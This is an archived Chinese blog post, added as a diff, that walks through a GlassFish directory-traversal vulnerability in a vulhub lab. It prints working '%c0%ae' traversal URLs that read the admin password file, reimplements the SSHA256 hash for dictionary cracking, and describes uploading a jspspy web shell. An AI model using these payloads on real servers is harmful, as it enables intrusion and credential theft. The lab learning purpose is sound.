@@ -1,0 +1,404 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>GlassFish 目录穿越漏洞测试过程 | 离别歌</title>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/styles.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/style.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./GlassFish 目录穿越漏洞测试过程  离别歌/jquery.min.js"></script>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/code.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/button.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./GlassFish 目录穿越漏洞测试过程  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;text=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;title=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;is_video=false&amp;description=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;title=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;title=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;title=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;title=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/glassfish-arbitrary-file-reading-vulnerability.html&amp;name=GlassFish%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">GlassFish 目录穿越漏洞测试过程</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2017年4月23日 21:20" itemprop="datePublished">
+                    2017 四月 23 21:20
+                </time>
+</div>
+<div class="article-tag">
+            阅读：1160
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/glassfish">glassfish</a>,
+                
+                <a class="tag-link" href="/tag/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E">任意文件读取漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>这是一个2015年的老漏洞，由于我最近在学习相关的知识，所以拿出来温习一下。</p>
+<h2 id="_1"><a class="toclink" href="#_1">搭建测试环境</a></h2>
+<p>vulhub（ <a href="https://github.com/phith0n/vulhub">https://github.com/phith0n/vulhub</a> ）是我学习各种漏洞的同时，创建的一个开源项目，旨在通过简单的两条命令，编译、运行一个完整的漏洞测试环境。</p>
+<p>如何拉取项目、安装docker和docker-compose我就不多说了，详见vulhub项目主页。来到GlassFish这个漏洞的详细页面 <a href="https://github.com/phith0n/vulhub/tree/master/glassfish/4.1.0">https://github.com/phith0n/vulhub/tree/master/glassfish/4.1.0</a> ，可以查看一些简要说明。</p>
+<p>在主机上拉取vulhub项目后，进入该目录，执行<code>docker-compose build</code>和<code>docker-compose up -d</code>两条命令，即可启动整个环境。</p>
+<p>本测试环境默认对外开放两个端口：8080和4848。8080是web应用端口，4848是管理GlassFish的端口，漏洞出现在4848端口下，但无需登录管理员账号即可触发。</p>
+<h2 id="_2"><a class="toclink" href="#_2">文件读取漏洞利用</a></h2>
+<p>漏洞原理与利用方法 <a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904">https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904</a> 。利用该目录穿越漏洞，可以列目录以及读取任意文件：</p>
+<div class="codehilite"><pre><span></span>https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config
+https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile
+</pre></div>
+<p><a href="/media/attachment/2017/04/23/b7cb8c56-f960-4cc6-b82b-0d5585ea6839.jpg"><img alt="14926907298618.jpg" src="./GlassFish 目录穿越漏洞测试过程  离别歌/b7cb8c56-f960-4cc6-b82b-0d5585ea6839.f6f406fc2ca1.jpg"/></a></p>
+<p>glassfish/domains/domain1/config/admin-keyfile是储存admin账号密码的文件，如上图，我们通过读取这个文件，拿到超级管理员的密码哈希。（说明一下，这个测试环境启动前，我通过修改docker-compose.yml，将超级管理员的密码改为了<code>123456</code>）</p>
+<h2 id="_3"><a class="toclink" href="#_3">密码加密方式？</a></h2>
+<p>可见，我们读到的密码是一串base64编码后的字符串，并且得到一个关键字：<code>ssha256</code>，这种“加密”方法可能和sha256有关。但，使用<code>echo strlen(base64_decode(...));</code>这个方式将上述base64字符串解码后测量长度，发现长为40字节。</p>
+<p>我们知道，常见的哈希算法，md5长度为16字节，sha1长度为20字节，sha256长度为32字节，sha512长度为64字节，并没有长度为40字节的哈希算法呀？</p>
+<p>很明显，<code>SSHA256</code>里应该掺杂有其他字符。</p>
+<p>所以，我们需要研究研究GlassFish源码。官网有SVN，但下载速度太慢。我们可以上Github下载打包好的源码 <a href="https://github.com/dmatej/Glassfish/archive/master.zip">https://github.com/dmatej/Glassfish/archive/master.zip</a> （不过这个源码比较老了）</p>
+<p>下载以后发现，压缩包竟然都有1个多G，在如此大的代码中，找一个哈希算法，真的不容易。不过在费尽千辛万苦后我还是找到了负责计算哈希的类：<code>SSHA</code>。</p>
+<p><a href="https://github.com/dmatej/Glassfish/blob/master/main/nucleus/common/common-util/src/main/java/org/glassfish/security/common/SSHA.java">https://github.com/dmatej/Glassfish/blob/master/main/nucleus/common/common-util/src/main/java/org/glassfish/security/common/SSHA.java</a></p>
+<p>这个类有两个比较重要的方法，<code>encode</code>和<code>compute</code>。<code>compute</code>负责对明文进行哈希计算，<code>encode</code>负责将前者的计算结果编码成base64。</p>
+<h2 id="encode"><a class="toclink" href="#encode"><code>encode</code>函数分析</a></h2>
+<p>先从简单的来，<code>encode</code>函数：</p>
+<div class="codehilite"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">encode</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">salt</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">hash</span><span class="o">,</span> <span class="n">String</span> <span class="n">algo</span><span class="o">)</span>
+<span class="o">{</span>       
+    <span class="kt">boolean</span> <span class="n">isSHA</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="n">algoSHA</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">algo</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">isSHA</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="k">if</span> <span class="o">(!</span><span class="n">isSHA</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">assert</span> <span class="o">(</span><span class="n">hash</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">32</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">assert</span> <span class="o">(</span><span class="n">hash</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">20</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kt">int</span> <span class="n">resultLength</span> <span class="o">=</span> <span class="mi">32</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">isSHA</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">resultLength</span> <span class="o">=</span> <span class="mi">20</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">res</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">resultLength</span><span class="o">+</span><span class="n">salt</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">res</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">resultLength</span><span class="o">);</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">salt</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">res</span><span class="o">,</span> <span class="n">resultLength</span><span class="o">,</span> <span class="n">salt</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
+    <span class="n">GFBase64Encoder</span> <span class="n">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GFBase64Encoder</span><span class="o">();</span>
+    <span class="n">String</span> <span class="n">encoded</span> <span class="o">=</span> <span class="n">encoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">res</span><span class="o">);</span>
+
+    <span class="n">String</span> <span class="n">out</span> <span class="o">=</span> <span class="n">SSHA_256_TAG</span> <span class="o">+</span> <span class="n">encoded</span><span class="o">;</span>
+    <span class="k">if</span><span class="o">(</span><span class="n">isSHA</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">SSHA_TAG</span> <span class="o">+</span> <span class="n">encoded</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="k">return</span> <span class="n">out</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>可见，该函数兼容两种哈希算法，<code>isSHA</code>表示的是长度为20字节的sha1，<code>!isSHA</code>表示的长度为32字节的sha256。</p>
+<p>根据我们通过文件读取漏洞得到的哈希长度和<code>SSHA256</code>这个关键词，我可以100%推测该哈希是sha256。看到<code>System.arraycopy(salt, 0, res, resultLength, salt.length);</code>这一行我就明白了：为什么我们读取到的哈希长度是40字节？</p>
+<p>因为还有8字节是salt。整个算法大概是这样：</p>
+<div class="codehilite"><pre><span></span>base64_encode( hash( 明文, SALT ) + SALT )
+</pre></div>
+<p>hash结果是32字节，salt长度8字节，将两者拼接后base64编码，最终得到我们读取到的那个哈希值。</p>
+<p>注意，上述所有的算法都是“raw data”。我们平时看到的<code>a356f21e901b...</code>这样的哈希结果是经过了hex编码的，本文不涉及任何hex编码。</p>
+<h2 id="compute"><a class="toclink" href="#compute"><code>compute</code>函数分析</a></h2>
+<p>再来分析一下复杂一点的函数<code>compute</code>：</p>
+<div class="codehilite"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">compute</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">salt</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">password</span><span class="o">,</span> <span class="n">String</span> <span class="n">algo</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">IllegalArgumentException</span>
+<span class="o">{</span>
+
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">buff</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">password</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="n">salt</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">password</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">buff</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">password</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">salt</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">buff</span><span class="o">,</span> <span class="n">password</span><span class="o">.</span><span class="na">length</span><span class="o">,</span> <span class="n">salt</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">hash</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+    <span class="kt">boolean</span> <span class="n">isSHA</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="k">if</span><span class="o">(</span><span class="n">algoSHA</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">algo</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">isSHA</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="n">MessageDigest</span> <span class="n">md</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">md</span> <span class="o">=</span> <span class="n">MessageDigest</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">algo</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="k">assert</span> <span class="o">(</span><span class="n">md</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">);</span>
+    <span class="n">md</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+    <span class="n">hash</span> <span class="o">=</span> <span class="n">md</span><span class="o">.</span><span class="na">digest</span><span class="o">(</span><span class="n">buff</span><span class="o">);</span>
+
+    <span class="k">if</span> <span class="o">(!</span><span class="n">isSHA</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="n">md</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+            <span class="n">md</span><span class="o">.</span><span class="na">update</span><span class="o">(</span><span class="n">hash</span><span class="o">);</span>
+            <span class="n">hash</span> <span class="o">=</span> <span class="n">md</span><span class="o">.</span><span class="na">digest</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>    
+    <span class="k">if</span> <span class="o">(</span><span class="n">isSHA</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">assert</span> <span class="o">(</span><span class="n">hash</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">20</span><span class="o">);</span> <span class="c1">// SHA output is 20 bytes</span>
+    <span class="o">}</span>
+    <span class="k">else</span> <span class="o">{</span>
+        <span class="k">assert</span> <span class="o">(</span><span class="n">hash</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">32</span><span class="o">);</span> <span class="c1">//SHA-256 output is 32 bytes</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">hash</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>这个函数接受三个参数：SALT、明文和算法。其主要过程如下：</p>
+<ol>
+<li>拼接明文和SALT，组成一个新的字符序列BUFF</li>
+<li>计算BUFF的哈希结果</li>
+<li>如果哈希算法是sha256，则再计算99次哈希结果，前一次的计算结果是下一次计算的参数</li>
+</ol>
+<p>将整个过程翻译成PHP代码以方便理解与测试：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$algo</span> <span class="o">=</span> <span class="s1">'sha256'</span><span class="p">;</span>
+<span class="nv">$e</span> <span class="o">=</span> <span class="nv">$plain</span> <span class="o">.</span> <span class="nv">$salt</span><span class="p">;</span>
+
+<span class="nv">$data</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="nv">$algo</span><span class="p">,</span> <span class="nv">$e</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$algo</span> <span class="o">==</span> <span class="s1">'sha256'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="nv">$algo</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span> <span class="o">.</span> <span class="nv">$salt</span><span class="p">);</span>
+</pre></div>
+<h2 id="_4"><a class="toclink" href="#_4">破解密码</a></h2>
+<p>测试一下我的代码是否正确。首先通过任意文件读取漏洞读取到目标服务器密文是<code>{SSHA256}52bI8VDr9aLll3hQHhJS/45141bDudXHDMyFx97dBzL9wVu03KQDtw==</code>，将其进行base64解码后，拿到末尾8个字节，是为salt，值为<code>\xfd\xc1\x5b\xb4\xdc\xa4\x03\xb7</code>。</p>
+<p>填入php代码中，计算明文<code>123456</code>的结果：</p>
+<p><a href="/media/attachment/2017/04/23/52361fc7-9a74-4794-9866-7c067aa48d3b.jpg"><img alt="14926998377254.jpg" src="./GlassFish 目录穿越漏洞测试过程  离别歌/52361fc7-9a74-4794-9866-7c067aa48d3b.ccac94bc392c.jpg"/></a></p>
+<p>可见，计算结果和我通过漏洞读取的结果一致，说明计算过程没有问题。</p>
+<p>不过我简单看了一下，hashcat并不支持这种哈希算法，所以如果需要破解密文的话，估计得自己编写相关破解的代码了。好在算法并不难，直接使用我给出的实例代码，循环跑字典即可。</p>
+<h2 id="getshell"><a class="toclink" href="#getshell">Getshell</a></h2>
+<p>破解了密码，进入GlassFish后台，是可以直接getshell的。</p>
+<p>点击Applications，右边的deploy：</p>
+<p><a href="/media/attachment/2017/04/23/a4dcc8cb-400f-4e84-8733-91f3cbcbc83e.jpg"><img alt="14927130586548.jpg" src="./GlassFish 目录穿越漏洞测试过程  离别歌/a4dcc8cb-400f-4e84-8733-91f3cbcbc83e.fa166603c370.jpg"/></a></p>
+<p>部署一个新应用，直接上传war包（附件中给一个测试环境java1.8能使用的包，网上找的老版本jspspy，加上自己改了一下兼容性，然后打包了。2016版的jspspy我没找着，该jspspy不能保证没有后门）：</p>
+<p><a href="/media/attachment/2017/04/23/d2f342b1-42c7-4e0c-b95b-03daf2b758fe.jpg"><img alt="14927142235179.jpg" src="./GlassFish 目录穿越漏洞测试过程  离别歌/d2f342b1-42c7-4e0c-b95b-03daf2b758fe.7f2aa6734d4a.jpg"/></a></p>
+<p>然后访问<code>http://your-ip:8080/jspspy/jspspy.jsp</code>即可，密码<code>xxxxxx</code>：</p>
+<p><a href="/media/attachment/2017/04/23/01535ebd-d1f6-4cd4-84bd-3fbf837bdda1.jpg"><img alt="14927150106612.jpg" src="./GlassFish 目录穿越漏洞测试过程  离别歌/01535ebd-d1f6-4cd4-84bd-3fbf837bdda1.65e2de3c06f9.jpg"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2686">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./GlassFish 目录穿越漏洞测试过程  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">哈哈哈哈哈</a>
+<time datetime="2017年5月3日 01:24" itemprop="datePublished">
+                            2017 五月 03 01:24
+                        </time>
+<a href="javascript:reply_to('2686', '哈哈哈哈哈')">回复</a>
+</p>
+<p class="comment-meta">这个your-ip 我是在虚拟机下搭建的 该添127.0.0.1 为什么没有成功</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2687">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./GlassFish 目录穿越漏洞测试过程  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com" target="_blank">phithon</a>
+<time datetime="2017年5月3日 01:40" itemprop="datePublished">
+                            2017 五月 03 01:40
+                        </time>
+<a href="javascript:reply_to('2687', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@哈哈哈哈哈 你在虚拟机下搭建就是虚拟机的IP。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2649">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./GlassFish 目录穿越漏洞测试过程  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">MT</a>
+<time datetime="2017年4月24日 21:43" itemprop="datePublished">
+                            2017 四月 24 21:43
+                        </time>
+<a href="javascript:reply_to('2649', 'MT')">回复</a>
+</p>
+<p class="comment-meta">\uC0AE最后怎么转义成ASCII码的"."的？？一直搞不懂</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2656">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./GlassFish 目录穿越漏洞测试过程  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">admin</a>
+<time datetime="2017年4月26日 10:59" itemprop="datePublished">
+                            2017 四月 26 10:59
+                        </time>
+<a href="javascript:reply_to('2656', 'admin')">回复</a>
+</p>
+<p class="comment-meta">@MT 符号UTF-8规则的"."的编码</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2648">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./GlassFish 目录穿越漏洞测试过程  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">her0ma</a>
+<time datetime="2017年4月24日 16:29" itemprop="datePublished">
+                            2017 四月 24 16:29
+                        </time>
+<a href="javascript:reply_to('2648', 'her0ma')">回复</a>
+</p>
+<p class="comment-meta">6666，前两天测试的时候还在想这个密码咋解出来呢，木有想到今天就看到解密姿势了！</p>
+</div>
+</div>
+<div class="row" id="comment-2647">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./GlassFish 目录穿越漏洞测试过程  离别歌/179250a8a14f94ba279a1234a7197856.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.lsafe.org" target="_blank">离心</a>
+<time datetime="2017年4月24日 12:00" itemprop="datePublished">
+                            2017 四月 24 12:00
+                        </time>
+<a href="javascript:reply_to('2647', '离心')">回复</a>
+</p>
+<p class="comment-meta">一楼！</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
